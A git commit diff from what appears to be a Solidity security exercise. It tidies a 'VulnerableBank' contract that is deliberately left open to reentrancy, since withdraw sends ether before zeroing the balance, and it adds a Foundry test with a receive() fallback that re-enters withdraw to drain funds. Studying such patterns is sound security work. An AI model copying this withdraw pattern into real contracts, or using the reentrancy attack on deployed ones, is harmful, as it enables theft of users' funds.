f4ed5b02dc954311099a5552a9b1cf421d21c30f
Alberto <albertofm1992@gmail.com>
2025-05-04 21:12:05 +0300

    Tests Added

--- src/VulnerableBank.sol
+++ src/VulnerableBank.sol
@@ -3,32 +3,25 @@
 pragma solidity 0.8.28;
 
 contract VulnerableBank {
-
-    mapping(address=>uint256) public userBalance;
+    mapping(address => uint256) public userBalance;
     uint256 minimumDeposit = 1 ether;
 
-    function deposit() public payable{
+    function deposit() public payable {
         require(msg.value >= minimumDeposit, "Minimum deposit not reached");
-        userBalance[msg.sender]+= msg.value; 
-
+        userBalance[msg.sender] += msg.value;
     }
 
-    function withdraw() public{
-
+    function withdraw() public {
         require(userBalance[msg.sender] >= 1, "No available balance");
         require(address(this).balance > 0, "Bank has no funds");
 
         (bool success,) = msg.sender.call{value: userBalance[msg.sender]}("");
-        require(success,"Tx failed");
+        require(success, "Tx failed");
 
         userBalance[msg.sender] = 0; // vulnerability
-
     }
 
-    function totalBalance() public view returns(uint256){
-
+    function totalBalance() public view returns (uint256) {
         return address(this).balance;
-
     }
-
 }
--- test/VulnerableBankTest.t.sol
+++ test/VulnerableBankTest.t.sol
@@ -6,12 +6,27 @@ import "forge-std/Test.sol";
 import "../src/VulnerableBank.sol";
 
 contract VulnerableBankTest is Test {
-
     VulnerableBank vulnerableBank;
+    uint256 initialAttackerBalance = 10 ether;
+    address attacker = vm.addr(1);
+    address user = vm.addr(2);
 
-    function setUp() public{
-
-
+    function setUp() public {
+        vulnerableBank = new VulnerableBank();
     }
 
+    function testAtack() public {
+        uint256 amount_ = 1 ether;
+        vm.deal(attacker, initialAttackerBalance);
+        vm.startPrank(attacker);
+        vulnerableBank.deposit{value: amount_}();
+        vulnerableBank.withdraw();
+        vm.stopPrank();
+    }
+
+    receive() external payable {
+        if (address(vulnerableBank).balance >= 1 ether) {
+            vulnerableBank.withdraw();
+        }
+    }
 }
